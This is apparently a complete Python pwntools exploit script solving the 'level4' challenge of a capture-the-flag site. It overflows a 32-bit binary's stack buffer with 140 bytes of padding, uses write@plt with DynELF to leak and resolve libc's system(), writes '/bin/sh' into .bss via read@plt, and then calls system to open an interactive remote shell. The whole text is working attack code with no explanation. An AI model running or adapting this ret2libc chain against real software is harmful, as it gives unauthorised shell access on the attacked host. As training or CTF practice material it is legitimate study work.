from pwn import *

conn = remote('pwn2.jarvisoj.com', 9880)
elf = ELF('./level4')

write_plt = elf.plt['write']
read_plt = elf.plt['read']
vul_addr = 0x804844b
bss_addr = 0x0804a024

def leak(address):
    payload = 'a' * 140 + p32(write_plt) + p32(vul_addr) + p32(1) + p32(address) + p32(4)
    conn.sendline(payload)
    data = conn.recv(4)
    return data

dynelf = DynELF(leak, elf = elf)
system_addr = dynelf.lookup('system', 'libc')

print(hex(system_addr))

payload1 = 'a' * 140 + p32(read_plt) + p32(vul_addr) + p32(0) + p32(bss_addr) + p32(8)
conn.sendline(payload1)
conn.send('/bin/sh\x00')

payload2 = 'a' * 140  + p32(system_addr) + 'bbbb' + p32(bss_addr)
conn.sendline(payload2)

conn.interactive()